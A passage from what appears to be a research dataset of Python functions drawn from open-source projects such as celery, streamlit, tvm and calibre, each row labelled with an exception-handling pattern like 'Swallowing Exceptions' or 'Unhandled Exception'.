        controller.start_replay(start_replay)

    # Check the static data.
    static_data = []
    for controller, t in zip(controllers, timers):
      with t(""data""):
        static_data.append(controller.data_raw())

    if FLAGS.diff:
      diffs = {i: proto_diff.compute_diff(static_data[0], d)
               for i, d in enumerate(static_data[1:], 1)}
      if any(diffs.values()):
        print("" Diff in static data "".center(80, ""-""))
        for i, diff in diffs.items():
          if diff:
            print(targets[i])
            diff_counts[i] += 1
            print(diff.report(truncate_to=FLAGS.truncate))
            for path in diff.all_diffs():
              diff_paths[path.with_anonymous_array_indices()] += 1
      else:
        print(""No diffs in static data."")

    # Run some steps, checking speed and diffing the observations.
    for _ in range(FLAGS.count):
      for controller, t in zip(controllers, timers):
        with t(""step""):
          controller.step(FLAGS.step_mul)

      obs = []
      for controller, t in zip(controllers, timers):
        with t(""observe""):
          obs.append(controller.observe())

      if FLAGS.diff:
        for o in obs:
          _clear_non_deterministic_fields(o)

        diffs = {i: proto_diff.compute_diff(obs[0], o)
                 for i, o in enumerate(obs[1:], 1)}
        if any(diffs.values()):
          print(("" Diff on step: %s "" %
                 obs[0].observation.game_loop).center(80, ""-""))
          for i, diff in diffs.items():
            if diff:
              print(targets[i])
              diff_counts[i] += 1
              print(diff.report([image_differencer.image_differencer],
                                truncate_to=FLAGS.truncate))
              for path in diff.all_diffs():
                diff_paths[path.with_anonymous_array_indices()] += 1

      if obs[0].player_result:
        break
  except KeyboardInterrupt:
    pass
  finally:
    for c in controllers:
      c.quit()
      c.close()

    for p in procs:
      p.close()

  if FLAGS.diff:
    print("" Diff Counts by target "".center(80, ""-""))
    for target, count in zip(targets, diff_counts):
      print("" %5d %s"" % (count, target))
    print()

    print("" Diff Counts by observation path "".center(80, ""-""))
    for path, count in diff_paths.most_common(100):
      print("" %5d %s"" % (count, path))
    print()

  print("" Timings "".center(80, ""-""))
  for v, t in zip(targets, timers):
    print(v)
    print(t)",Swallowing Exceptions,1
305,auto-sklearn,/home/r4ph/desenv/phd/exception-miner/projects/py/auto-sklearn/test/fixtures/dask.py,create_test_dask_client,"def create_test_dask_client(
    id: str,
    n_workers: int = 2,
) -> Client:
    """"""Factory to make a Dask client and a function to close it
    them.

    Parameters
    ----------
    id: str
        An id to associate with this dask client

    n_workers: int = 2

    Returns
    -------
    Client
        The client
    """"""
    # Workers are in subprocesses to not create deadlocks with the pynisher
    # and logging.
    client = Client(
        n_workers=n_workers,
        threads_per_worker=1,
        processes=False,
        scheduler_port=0,  # Set to 0 so it chooses a random one
        dashboard_address=None,  # Disable dashboarding
    )
    adr = client.scheduler_info()[""address""]

    def close() -> None:
        try:
            client = get_client(adr, timeout=1)
            client.shutdown()
        except Exception:
            pass

    active_clients[id] = close

    return client",Swallowing Exceptions,1
306,mailpile,/home/r4ph/desenv/phd/exception-miner/projects/py/mailpile/mailpile/auth.py,command,"def command(self):
        # FIXME: Should this only be a POST request?
        # FIXME: This needs CSRF protection.

        session_id = self.session.ui.html_variables.get('http_session')
        if self.args and not session_id:
            session_id = self.args[0]

        if session_id:
            try:
                self.session.ui.debug('Logging out %s' % session_id)
                del SESSION_CACHE[session_id]
                return self._success(_('Goodbye!'))
            except KeyError:
                pass

        return self._error(_('No session found!'))",Swallowing Exceptions,1
307,kivy,/home/r4ph/desenv/phd/exception-miner/projects/py/kivy/kivy/tests/test_storage.py,test_redis_storage,"def test_redis_storage(self):
        if os.environ.get('NONETWORK'):
            return
        try:
            from kivy.storage.redisstore import RedisStore
            from redis.exceptions import ConnectionError
            try:
                params = dict(db=15)
                self._do_store_test_empty(RedisStore(params))
                self._do_store_test_filled(RedisStore(params))
            except ConnectionError:
                pass
        except ImportError:
            pass",Swallowing Exceptions,1
308,quantaxis,/home/r4ph/desenv/phd/exception-miner/projects/py/quantaxis/QUANTAXIS/QAData/data_resample.py,QA_data_ctptick_resample,"def QA_data_ctptick_resample(tick, type_='1min'):
    """"""tick采样成任意级别分钟线

    Arguments:
        tick {[type]} -- transaction

    Returns:
        [type] -- [description]
    """"""

    resx = pd.DataFrame()
    _temp = set(tick.TradingDay)

    for item in _temp:

        _data = tick.query('TradingDay==""{}""'.format(item))
        try:
            _data.loc[time(20, 0):time(21, 0), 'volume'] = 0
        except:
            pass

        _data.volume = _data.volume.diff()
        _data = _data.assign(amount=_data.LastPrice * _data.volume)
        #_data0 = _data[time(0,
        #                    0):time(2,
        #                            30)].resample(
        #                                type_,
        #                                closed='right',
        #                                base=30,
        #                                loffset=type_
        #                            ).apply(
        #                                {
        #                                    'LastPrice': 'ohlc',
        #                                    'volume': 'sum',
        #                                    'code': 'last',
        #                                    'amount': 'sum'
        #                                }
        #                            )
        # 适配 pandas 1.0+，避免出现 FutureWarning: 
        # 'loffset' in .resample() and in Grouper() is deprecated 提示
        _data0 = _data[time(0,
                            0):time(2,
                                    30)].resample(
                                         type_,
                                         closed='right',
                                         offset=""30min"",
                                        ).apply(
                                        {
                                            'LastPrice': 'ohlc',
                                            'volume': 'sum',
                                            'code': 'last',
                                            'amount': 'sum'
                                        }
                                    )
        _data0.index = _data0.index + to_offset(type_)
        #_data1 = _data[time(9,
        #                    0):time(11,
        #                            30)].resample(
        #                                type_,
        #                                closed='right',
        #                                base=30,
        #                                loffset=type_
        #                            ).apply(
        #                                {
        #                                    'LastPrice': 'ohlc',
        #                                    'volume': 'sum',
        #                                    'code': 'last',
        #                                    'amount': 'sum'
        #                                }
        #                            )
        _data1 = _data[time(9,
                            0):time(11,
                                    30)].resample(
                                        type_,
                                        closed='right',
                                        offset=""30min"",
                                    ).apply(
                                        {
                                            'LastPrice': 'ohlc',
                                            'volume': 'sum',
                                            'code': 'last',
                                            'amount': 'sum'
                                        }
                                    )
        _data1.index = _data1.index + to_offset(type_)
        _data2 = _data[time(13,
                            1):time(15,
                                    0)].resample(
                                        type_,
                                        closed='right',
                                        offset=""30min"",
                                    ).apply(
                                        {
                                            'LastPrice': 'ohlc',
                                            'volume': 'sum',
                                            'code': 'last',
                                            'amount': 'sum'
                                        }
                                    )
        _data2.index = _data2.index + to_offset(type_)

        _data3 = _data[time(21,
                            0):time(23,
                                    59)].resample(
                                        type_,
                                        closed='right',
                                        offset=""30min"",
                                    ).apply(
                                        {
                                            'LastPrice': 'ohlc',
                                            'volume': 'sum',
                                            'code': 'last',
                                            'amount': 'sum'
                                        }
                                    )
        _data3.index = _data3.index + to_offset(type_)

        resx = resx.append(_data0).append(_data1).append(_data2).append(_data3)
    resx.columns = resx.columns.droplevel(0)
    return resx.reset_index().drop_duplicates().set_index(['datetime',
                                                           'code']).sort_index()",Swallowing Exceptions,1
309,unilm,/home/r4ph/desenv/phd/exception-miner/projects/py/unilm/kosmos-2/fairseq/fairseq/data/plasma_utils.py,__init__,"def __init__(self, array, split_path: str, hash_data: Hashable, plasma_path=None):
        """"""
        Args:
            array: numpy array to store. This can be read with ``PlasmaView().array``
            split_path: the path whence the data was read, used for hashing
            hash_data: other metadata about the array that can be used to create a unique key.
                as of writing, the 3 callers in ``TokenBlockDataset`` use::

                    hash_data = ((block_size, document_sep_len, str(break_mode), len(dataset)), 0|1|2)


        """"""
        assert PYARROW_AVAILABLE
        assert split_path is not None
        if plasma_path is None:
            plasma_path = DEFAULT_PLASMA_PATH

        self.path = plasma_path
        self.split_path = split_path
        self._client = None  # Initialize lazily for pickle. plasma clients should not be deep copied or serialized.
        self._n = None

        self.object_id = self.get_object_id(self.split_path, hash_data)
        try:
            self.client.put(array, object_id=self.object_id)
        except plasma.PlasmaObjectExists:
            pass",Swallowing Exceptions,1
310,celery,/home/r4ph/desenv/exception-miner/projects/py/celery/celery/apps/multi.py,_setdefaultopt,"def _setdefaultopt(self, d, alt, value):
        for opt in alt[1:]:
            try:
                return d[opt]
            except KeyError:
                pass
        value = d.setdefault(alt[0], os.path.normpath(value))
        dir_path = os.path.dirname(value)
        if dir_path and not os.path.exists(dir_path):
            os.makedirs(dir_path)
        return value",Swallowing Exceptions,1
311,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/ebooks/odt/input.py,filter_load,"def filter_load(self, odffile, mi, log):
        """""" This is an adaption from ODF2XHTML. It adds a step between
            load and parse of the document where the Element tree can be
            modified.
        """"""
        # first load the odf structure
        self.lines = []
        self._wfunc = self._wlines
        if isinstance(odffile, string_or_bytes) \
                or hasattr(odffile, 'read'):  # Added by Kovid
            self.document = odLoad(odffile)
        else:
            self.document = odffile
        # filter stuff
        self.search_page_img(mi, log)
        try:
            self.filter_cover(mi, log)
        except:
            pass
        # parse the modified tree and generate xhtml
        self._walknode(self.document.topnode)",Swallowing Exceptions,1
312,qutebrowser,/home/r4ph/desenv/phd/exception-miner/projects/py/qutebrowser/qutebrowser/browser/webkit/network/networkmanager.py,set_referer,"def set_referer(self, req, current_url):
        """"""Set the referer header.""""""
        referer_header_conf = config.val.content.headers.referer

        try:
            if referer_header_conf == 'never':
                # Note: using ''.encode('ascii') sends a header with no value,
                # instead of no header at all
                req.setRawHeader(b'Referer', QByteArray())
            elif (referer_header_conf == 'same-domain' and
                  not urlutils.same_domain(req.url(), current_url)):
                req.setRawHeader(b'Referer', QByteArray())
            # If refer_header_conf is set to 'always', we leave the header
            # alone as QtWebKit did set it.
        except urlutils.InvalidUrlError:
            # req.url() or current_url can be invalid - this happens on
            # https://www.playstation.com/ for example.
            pass",Swallowing Exceptions,1
313,numba,/home/r4ph/desenv/phd/exception-miner/projects/py/numba/numba/cuda/cudadrv/driver.py,_find_api,"def _find_api(self, fname):
        # We use alternatively-named functions for PTDS with the Numba ctypes
        # binding. For the NVidia binding, it handles linking to the correct
        # variant.
        if config.CUDA_PER_THREAD_DEFAULT_STREAM and not USE_NV_BINDING:
            variants = ('_v2_ptds', '_v2_ptsz', '_ptds', '_ptsz', '_v2', '')
        else:
            variants = ('_v2', '')

        for variant in variants:
            try:
                return getattr(self.lib, f'{fname}{variant}')
            except AttributeError:
                pass

        # Not found.
        # Delay missing function error to use
        def absent_function(*args, **kws):
            raise CudaDriverError(f'Driver missing function: {fname}')

        setattr(self, fname, absent_function)
        return absent_function",Swallowing Exceptions,1
314,celery,/home/r4ph/desenv/exception-miner/projects/py/celery/celery/concurrency/asynpool.py,_stop_task_handler,"def _stop_task_handler(task_handler):
        """"""Called at shutdown to tell processes that we're shutting down.""""""
        for proc in task_handler.pool:
            try:
                setblocking(proc.inq._writer, 1)
            except OSError:
                pass
            else:
                try:
                    proc.inq.put(None)
                except OSError as exc:
                    if exc.errno != errno.EBADF:
                        raise",Swallowing Exceptions,1
315,osx-kvm,/home/r4ph/desenv/exception-miner/projects/py/osx-kvm/fetch-macOS-v2.py,main,"def main():
    parser = argparse.ArgumentParser(description='Gather recovery information for Macs')
    parser.add_argument('--action', choices=['download', 'selfcheck', 'verify', 'guess'], default='',
                        help='Action to perform: ""download"" - performs recovery downloading,'
                        ' ""selfcheck"" checks whether MLB serial validation is possible, ""verify"" performs'
                        ' MLB serial verification, ""guess"" tries to find suitable mac model for MLB.')
    parser.add_argument('-o', '--outdir', type=str, default='com.apple.recovery.boot',
                        help='customise output directory for downloading, defaults to com.apple.recovery.boot')
    parser.add_argument('-n', '--basename', type=str, default='',
                        help='customise base name for downloading, defaults to remote name')
    parser.add_argument('-b', '--board-id', type=str, default=RECENT_MAC,
                        help=f'use specified board identifier for downloading, defaults to {RECENT_MAC}')
    parser.add_argument('-m', '--mlb', type=str, default=MLB_ZERO,
                        help=f'use specified logic board serial for downloading, defaults to {MLB_ZERO}')
    parser.add_argument('-e', '--code', type=str, default='',
                        help='generate product logic board serial with specified product EEEE code')
    parser.add_argument('-os', '--os-type', type=str, default='default', choices=['default', 'latest'],
                        help=f'use specified os type, defaults to default {MLB_ZERO}')
    parser.add_argument('-diag', '--diagnostics', action='store_true', help='download diagnostics image')
    parser.add_argument('-s', '--shortname', type=str, default='',
                        help='available options: high-sierra, mojave, catalina, big-sur, monterey, ventura')
    parser.add_argument('-v', '--verbose', action='store_true', help='print debug information')
    parser.add_argument('-db', '--board-db', type=str, default=os.path.join(SELF_DIR, 'boards.json'),
                        help='use custom board list for checking, defaults to boards.json')

    args = parser.parse_args()

    if args.code != '':
        args.mlb = mlb_from_eeee(args.code)

    if len(args.mlb) != 17:
        print('ERROR: Cannot use MLBs in non 17 character format!')
        sys.exit(1)

    if args.action == 'download':
        return action_download(args)
    if args.action == 'selfcheck':
        return action_selfcheck(args)
    if args.action == 'verify':
        return action_verify(args)
    if args.action == 'guess':
        return action_guess(args)

    # No action specified, so present a download menu instead
    # https://github.com/acidanthera/OpenCorePkg/blob/master/Utilities/macrecovery/boards.json
    products = [
            {""name"": ""High Sierra (10.13)"", ""b"": ""Mac-7BA5B2D9E42DDD94"", ""m"": ""00000000000J80300"", ""short"": ""high-sierra""},
            {""name"": ""Mojave (10.14)"", ""b"": ""Mac-7BA5B2DFE22DDD8C"", ""m"": ""00000000000KXPG00"", ""short"": ""mojave""},
            {""name"": ""Catalina (10.15)"", ""b"": ""Mac-00BE6ED71E35EB86"", ""m"": ""00000000000000000"", ""short"": ""catalina""},
            {""name"": ""Big Sur (11.7) - RECOMMENDED"", ""b"": ""Mac-2BD1B31983FE1663"", ""m"": ""00000000000000000"", ""short"": ""big-sur""},
            {""name"": ""Monterey (12.6)"", ""b"": ""Mac-B809C3757DA9BB8D"", ""m"": ""00000000000000000"", ""os_type"": ""latest"", ""short"": ""monterey""},
            {""name"": ""Ventura (13)"", ""b"": ""Mac-7BA5B2D9E42DDD94"", ""m"": ""00000000000000000"", ""os_type"": ""latest"", ""short"": ""ventura""},
            {""name"": ""Sonoma (14) "", ""b"": ""Mac-A61BADE1FDAD7B05"", ""m"": ""00000000000000000"", ""short"": ""sonoma""}
    ]
    for index, product in enumerate(products):
        name = product[""name""]
        print('%s. %12s' % (index + 1, name))
    # test locally using args.shortname = 'mojave'
    if not args.shortname or args.shortname == '':
        answer = input('\nChoose a product to download (1-%s): ' % len(products))
        try:
            index = int(answer) - 1
            if index < 0:
                raise ValueError
        except (ValueError, IndexError):
            pass
    else:
        index = 0
        for product in products:
            if args.shortname == product['short']:
                break
            else:
                index = index+1
    product = products[index]
    try:
        os_type = product[""os_type""]
    except:
        os_type = ""default""
    args = gdata(mlb = product[""m""], board_id = product[""b""], diagnostics =
            False, os_type = os_type, verbose=False, basename="""", outdir=""."")
    action_download(args)",Swallowing Exceptions,1
316,erpnext,/home/r4ph/desenv/phd/exception-miner/projects/py/erpnext/erpnext/patches/v14_0/update_partial_tds_fields.py,execute,"def execute():
	# Only do for current fiscal year, no need to repost for all years
	for company in frappe.get_all(""Company""):
		try:
			fiscal_year_details = get_fiscal_year(date=nowdate(), company=company.name, as_dict=True)

			purchase_invoice = frappe.qb.DocType(""Purchase Invoice"")

			frappe.qb.update(purchase_invoice).set(
				purchase_invoice.tax_withholding_net_total, purchase_invoice.net_total
			).set(
				purchase_invoice.base_tax_withholding_net_total, purchase_invoice.base_net_total
			).where(
				purchase_invoice.company == company.name
			).where(
				purchase_invoice.apply_tds == 1
			).where(
				purchase_invoice.posting_date >= fiscal_year_details.year_start_date
			).where(
				purchase_invoice.docstatus == 1
			).run()

			purchase_order = frappe.qb.DocType(""Purchase Order"")

			frappe.qb.update(purchase_order).set(
				purchase_order.tax_withholding_net_total, purchase_order.net_total
			).set(
				purchase_order.base_tax_withholding_net_total, purchase_order.base_net_total
			).where(
				purchase_order.company == company.name
			).where(
				purchase_order.apply_tds == 1
			).where(
				purchase_order.transaction_date >= fiscal_year_details.year_start_date
			).where(
				purchase_order.docstatus == 1
			).run()
		except FiscalYearError:
			pass",Swallowing Exceptions,1
317,gitsome,/home/r4ph/desenv/phd/exception-miner/projects/py/gitsome/xonsh/ply/ply/cpp.py,include,"def include(self,tokens):
        # Try to extract the filename and then process an include file
        if not tokens:
            return
        if tokens:
            if tokens[0].value != '<' and tokens[0].type != self.t_STRING:
                tokens = self.expand_macros(tokens)

            if tokens[0].value == '<':
                # Include <...>
                i = 1
                while i < len(tokens):
                    if tokens[i].value == '>':
                        break
                    i += 1
                else:
                    print(""Malformed #include <...>"")
                    return
                filename = """".join([x.value for x in tokens[1:i]])
                path = self.path + [""""] + self.temp_path
            elif tokens[0].type == self.t_STRING:
                filename = tokens[0].value[1:-1]
                path = self.temp_path + [""""] + self.path
            else:
                print(""Malformed #include statement"")
                return
        for p in path:
            iname = os.path.join(p,filename)
            try:
                data = self.read_include_file(iname)
                dname = os.path.dirname(iname)
                if dname:
                    self.temp_path.insert(0,dname)
                for tok in self.parsegen(data,filename):
                    yield tok
                if dname:
                    del self.temp_path[0]
                break
            except IOError:
                pass
        else:
            print(""Couldn't find '%s'"" % filename)",Swallowing Exceptions,1
318,streamlit,/home/r4ph/desenv/exception-miner/projects/py/streamlit/lib/streamlit/delta_generator.py,_block,"def _block(
        self,
        block_proto: Block_pb2.Block = Block_pb2.Block(),
    ) -> DeltaGenerator:
        # Operate on the active DeltaGenerator, in case we're in a `with` block.
        dg = self._active_dg

        # Prevent nested columns & expanders by checking all parents.
        block_type = block_proto.WhichOneof(""type"")
        # Convert the generator to a list, so we can use it multiple times.
        parent_block_types = list(dg._parent_block_types)

        if block_type == ""column"":
            num_of_parent_columns = self._count_num_of_parent_columns(
                parent_block_types
            )
            if (
                self._root_container == RootContainer.SIDEBAR
                and num_of_parent_columns > 0
            ):
                raise StreamlitAPIException(
                    ""Columns cannot be placed inside other columns in the sidebar. This is only possible in the main area of the app.""
                )
            if num_of_parent_columns > 1:
                raise StreamlitAPIException(
                    ""Columns can only be placed inside other columns up to one level of nesting.""
                )
        if block_type == ""expandable"" and block_type in frozenset(parent_block_types):
            raise StreamlitAPIException(
                ""Expanders may not be nested inside other expanders.""
            )

        if dg._root_container is None or dg._cursor is None:
            return dg

        msg = ForwardMsg_pb2.ForwardMsg()
        msg.metadata.delta_path[:] = dg._cursor.delta_path
        msg.delta.add_block.CopyFrom(block_proto)

        # Normally we'd return a new DeltaGenerator that uses the locked cursor
        # below. But in this case we want to return a DeltaGenerator that uses
        # a brand new cursor for this new block we're creating.
        block_cursor = cursor.RunningCursor(
            root_container=dg._root_container,
            parent_path=dg._cursor.parent_path + (dg._cursor.index,),
        )
        block_dg = DeltaGenerator(
            root_container=dg._root_container,
            cursor=block_cursor,
            parent=dg,
            block_type=block_type,
        )
        # Blocks inherit their parent form ids.
        # NOTE: Container form ids aren't set in proto.
        block_dg._form_data = FormData(current_form_id(dg))

        # Must be called to increment this cursor's index.
        dg._cursor.get_locked_cursor(last_index=None)
        _enqueue_message(msg)

        caching.save_block_message(
            block_proto,
            invoked_dg_id=self.id,
            used_dg_id=dg.id,
            returned_dg_id=block_dg.id,
        )

        return block_dg",Unhandled Exception,1
319,tvm,/home/r4ph/desenv/phd/exception-miner/projects/py/tvm/python/tvm/rpc/server.py,_serve_loop,"def _serve_loop():
        _server_env(load_library, work_path)
        _ffi_api.ServerLoop(sock.fileno())",Unhandled Exception,1
320,frida,/home/r4ph/desenv/phd/exception-miner/projects/py/frida/releng/meson/mesonbuild/backend/ninjabackend.py,_quoter,"def _quoter(x, qf = quote_func):
        if isinstance(x, NinjaCommandArg):
            if x.quoting == Quoting.none:
                return x.s
            elif x.quoting == Quoting.notNinja:
                return qf(x.s)
            elif x.quoting == Quoting.notShell:
                return ninja_quote(x.s)
            # fallthrough
        return ninja_quote(qf(str(x)))",Unhandled Exception,1
321,node-gyp,/home/r4ph/desenv/phd/exception-miner/projects/py/node-gyp/gyp/pylib/gyp/input.py,EvalCondition,"def EvalCondition(condition, conditions_key, phase, variables, build_file):
    """"""Returns the dict that should be used or None if the result was
  that nothing should be used.""""""
    if type(condition) is not list:
        raise GypError(conditions_key + "" must be a list"")
    if len(condition) < 2:
        # It's possible that condition[0] won't work in which case this
        # attempt will raise its own IndexError.  That's probably fine.
        raise GypError(
            conditions_key
            + "" ""
            + condition[0]
            + "" must be at least length 2, not ""
            + str(len(condition))
        )

    i = 0
    result = None
    while i < len(condition):
        cond_expr = condition[i]
        true_dict = condition[i + 1]
        if type(true_dict) is not dict:
            raise GypError(
                ""{} {} must be followed by a dictionary, not {}"".format(
                    conditions_key, cond_expr, type(true_dict)
                )
            )
        if len(condition) > i + 2 and type(condition[i + 2]) is dict:
            false_dict = condition[i + 2]
            i = i + 3
            if i != len(condition):
                raise GypError(
                    ""{} {} has {} unexpected trailing items"".format(
                        conditions_key, cond_expr, len(condition) - i
                    )
                )
        else:
            false_dict = None
            i = i + 2
        if result is None:
            result = EvalSingleCondition(
                cond_expr, true_dict, false_dict, phase, variables, build_file
            )

    return result",Unhandled Exception,1
322,spyder,/home/r4ph/desenv/phd/exception-miner/projects/py/spyder/external-deps/spyder-kernels/spyder_kernels/console/tests/test_console_kernel.py,test_multiprocessing_2,"def test_multiprocessing_2(tmpdir):
    """"""
    Test that multiprocessing works.
    """"""
    # Command to start the kernel
    cmd = ""from spyder_kernels.console import start; start.main()""

    with setup_kernel(cmd) as client:
        # Remove all variables
        client.execute_interactive(""%reset -f"", timeout=TIMEOUT)

        # Write multiprocessing code to a file
        code = """"""
from multiprocessing import Pool

class myClass():
    def __init__(self, i):
        self.i = i + 10

def myFunc(i):
    return myClass(i)

if __name__ == '__main__':
    with Pool(5) as p:
        result = p.map(myFunc, [1, 2, 3])
    result = [r.i for r in result]
""""""
        p = tmpdir.join(""mp-test.py"")
        p.write(code)

        # Run code
        client.execute_interactive(
            ""%runfile {}"".format(repr(str(p))), timeout=TIMEOUT)

        # Verify that the `result` variable is defined
        client.inspect('result')
        msg = client.get_shell_msg(timeout=TIMEOUT)
        while ""found"" not in msg['content']:
            msg = client.get_shell_msg(timeout=TIMEOUT)
        content = msg['content']
        assert content['found']
        assert ""[11, 12, 13]"" in content['data']['text/plain']",Unhandled Exception,1
323,gamestonkterminal,/home/r4ph/desenv/phd/exception-miner/projects/py/gamestonkterminal/openbb_terminal/stocks/comparison_analysis/marketwatch_model.py,get_income_comparison,"def get_income_comparison(
    similar: List[str],
    timeframe: str = str(datetime.today().year - 1),
    quarter: bool = False,
) -> pd.DataFrame:
    """"""Get income data. [Source: Marketwatch].

    Parameters
    ----------
    similar : List[str]
        List of tickers to compare.
        Comparable companies can be accessed through
        finnhub_peers(), finviz_peers(), polygon_peers().
    timeframe : str
        Column header to compare
    quarter : bool, optional
        Whether to use quarterly statements, by default False
    export : str, optional
        Format to export data

    Returns
    -------
    pd.DataFrame
        Dataframe of income statements
    """"""
    df_financials_compared = get_financial_comparisons(
        similar, ""income"", timeframe, quarter
    )

    return df_financials_compared",Unhandled Exception,1
324,transformers,/home/r4ph/desenv/exception-miner/projects/py/transformers/src/transformers/testing_utils.py,python_one_liner_max_rss,"def python_one_liner_max_rss(self, one_liner_str):
        """"""
        Runs the passed python one liner (just the code) and returns how much max cpu memory was used to run the
        program.

        Args:
            one_liner_str (`string`):
                a python one liner code that gets passed to `python -c`

        Returns:
            max cpu memory bytes used to run the program. This value is likely to vary slightly from run to run.

        Requirements:
            this helper needs `/usr/bin/time` to be installed (`apt install time`)

        Example:

        ```
        one_liner_str = 'from transformers import AutoModel; AutoModel.from_pretrained(""t5-large"")'
        max_rss = self.python_one_liner_max_rss(one_liner_str)
        ```
        """"""

        if not cmd_exists(""/usr/bin/time""):
            raise ValueError(""/usr/bin/time is required, install with `apt install time`"")

        cmd = shlex.split(f""/usr/bin/time -f %M python -c '{one_liner_str}'"")
        with CaptureStd() as cs:
            execute_subprocess_async(cmd, env=self.get_env())
        # returned data is in KB so convert to bytes
        max_rss = int(cs.err.split(""\n"")[-2].replace(""stderr: "", """")) * 1024
        return max_rss",Unhandled Exception,1
325,streamlit,/home/r4ph/desenv/exception-miner/projects/py/streamlit/lib/streamlit/components/v1/component_arrow.py,_marshall_index,"def _marshall_index(proto, index):
    """"""Marshall pandas.DataFrame index into an ArrowTable proto.

    Parameters
    ----------
    proto : proto.ArrowTable
        Output. The protobuf for a Streamlit ArrowTable proto.

    index : Index or array-like
        Index to use for resulting frame.
        Will default to RangeIndex (0, 1, 2, ..., n) if no index is provided.

    """"""
    index = map(util._maybe_tuple_to_list, index.values)
    index_df = pd.DataFrame(index)
    proto.index = _dataframe_to_pybytes(index_df)",Unhandled Exception,1
326,pysyft,/home/r4ph/desenv/phd/exception-miner/projects/py/pysyft/packages/syft/tests/syft/service/action/action_object_test.py,test_actionobject_syft_getattr_dict,"def test_actionobject_syft_getattr_dict(worker, scenario):
    orig_obj = {""a"": 1, ""b"": 2}

    obj = ActionObject.from_obj(orig_obj)
    obj = helper_prepare_obj_for_scenario(scenario, worker, obj)

    assert obj == orig_obj
    assert obj[""a""] == 1
    assert obj.update({""c"": 3}) == {""a"": 1, ""b"": 2, ""c"": 3}
    assert ""a"" in obj
    assert obj[""a""] == 1
    assert obj.clear() == {}",Unhandled Exception,1
327,openpilot,/home/r4ph/desenv/exception-miner/projects/py/openpilot/tinygrad_repo/test/test_ops.py,test_fancy_conv2d,"def test_fancy_conv2d(self):
    bs = 2
    cin = 3
    cout = 1
    groups = 3
    H,W = 3,3
    helper_test_op([(bs,cin,11,28), (groups*cout,cin//groups,H,W)],
      lambda x,w: torch.nn.functional.conv2d(x,w,groups=groups).relu(),
      lambda x,w: Tensor.conv2d(x,w,groups=groups).relu(), atol=1e-4, grad_rtol=1e-5)",Unhandled Exception,1
328,cython,/home/r4ph/desenv/phd/exception-miner/projects/py/cython/tests/run/test_grammar.py,test_var_annot_rhs,"def test_var_annot_rhs(self):
        ns = {}
        exec('x: tuple = 1, 2', ns)
        self.assertEqual(ns['x'], (1, 2))
        stmt = ('def f():\n'
                '    x: int = yield')
        exec(stmt, ns)
        self.assertEqual(list(ns['f']()), [None])

        ns = {""a"": 1, 'b': (2, 3, 4), ""c"":5, ""Tuple"": typing.Tuple}
        exec('x: Tuple[int, ...] = a,*b,c', ns)
        self.assertEqual(ns['x'], (1, 2, 3, 4, 5))",Unhandled Exception,1
329,tvm,/home/r4ph/desenv/phd/exception-miner/projects/py/tvm/tests/python/frontend/pytorch/test_forward.py,test_roll,"def test_roll():
    """"""Test for aten::roll""""""

    def test_fn(shifts, dims):
        return lambda x: torch.roll(x, shifts, dims)

    x = torch.tensor([1, 2, 3, 4, 5, 6, 7, 8]).view(4, 2)
    verify_model(test_fn(1, 0), [x])
    verify_model(test_fn(-1, 0), [x])
    verify_model(test_fn(shifts=(2, 1), dims=(0, 1)), [x])",Unhandled Exception,1
330,pytorch-image-models,/home/r4ph/desenv/exception-miner/projects/py/pytorch-image-models/timm/models/tnt.py,tnt_b_patch16_224,"def tnt_b_patch16_224(pretrained=False, **kwargs):
    model_cfg = dict(
        patch_size=16, embed_dim=640, inner_dim=40, depth=12, num_heads_outer=10,
        qkv_bias=False)
    model = _create_tnt('tnt_b_patch16_224', pretrained=pretrained, **dict(model_cfg, **kwargs))
    return model",Unhandled Exception,1
331,ray,/home/r4ph/desenv/exception-miner/projects/py/ray/dashboard/utils.py,get_address_for_submission_client,"def get_address_for_submission_client(address: Optional[str]) -> str:
    """"""Get Ray API server address from Ray bootstrap or Client address.

    If None, it will try to auto-detect a running Ray instance, or look
    for local GCS process.

    `address` is always overridden by the RAY_ADDRESS environment
    variable, just like the `address` argument in `ray.init()`.

    Args:
        address: Ray cluster bootstrap address or Ray Client address.
            Could also be ""auto"".

    Returns:
        API server HTTP URL, e.g. ""http://<head-node-ip>:8265"".
    """"""
    if os.environ.get(""RAY_ADDRESS""):
        logger.debug(f""Using RAY_ADDRESS={os.environ['RAY_ADDRESS']}"")
        address = os.environ[""RAY_ADDRESS""]

    if address and ""://"" in address:
        module_string, _ = split_address(address)
        if module_string == ""ray"":
            logger.debug(
                f""Retrieving API server address from Ray Client address {address}...""
            )
            address = ray_client_address_to_api_server_url(address)
    else:
        # User specified a non-Ray-Client Ray cluster address.
        address = ray_address_to_api_server_url(address)
    logger.debug(f""Using API server address {address}."")
    return address",Unhandled Exception,1
332,numpy,/home/r4ph/desenv/exception-miner/projects/py/numpy/vendored-meson/meson/mesonbuild/compilers/detect.py,detect_cpp_compiler,"def detect_cpp_compiler(env: 'Environment', for_machine: MachineChoice) -> Compiler:
    return _detect_c_or_cpp_compiler(env, 'cpp', for_machine)",Unhandled Exception,1
333,pytorch-image-models,/home/r4ph/desenv/exception-miner/projects/py/pytorch-image-models/timm/models/pvt_v2.py,pvt_v2_b3,"def pvt_v2_b3(pretrained=False, **kwargs):
    model_kwargs = dict(
        depths=(3, 4, 18, 3), embed_dims=(64, 128, 320, 512), num_heads=(1, 2, 5, 8),
        norm_layer=partial(nn.LayerNorm, eps=1e-6), **kwargs)
    return _create_pvt2('pvt_v2_b3', pretrained=pretrained, **model_kwargs)",Unhandled Exception,1
334,paddlehub,/home/r4ph/desenv/phd/exception-miner/projects/py/paddlehub/modules/image/text_to_image/disco_diffusion_ernievil_base/vit_b_16x/ernievil2/transformers/efficientnet.py,EfficientNetB3,"def EfficientNetB3(padding_type='SAME', override_params=None, use_se=True, pretrained=False, use_ssld=False, **kwargs):
    model = EfficientNet(name='b3', padding_type=padding_type, override_params=override_params, use_se=use_se, **kwargs)
    _load_pretrained(pretrained, model, MODEL_URLS[""EfficientNetB3""])
    return model",Unhandled Exception,1
335,ipython,/home/r4ph/desenv/exception-miner/projects/py/ipython/docs/autogen_shortcuts.py,format_filter,"def format_filter(
    filter_: Union[Filter, _NestedFilter, Condition, _Invert],
    is_top_level=True,
    skip=None,
) -> str:
    """"""Create easily readable description of the filter.""""""
    s = filter_.__class__.__name__
    if s == ""Condition"":
        func = cast(Condition, filter_).func
        if filter_ in HUMAN_NAMES_FOR_FILTERS:
            return HUMAN_NAMES_FOR_FILTERS[filter_]
        name = func.__name__
        if name == ""<lambda>"":
            source = getsource(func)
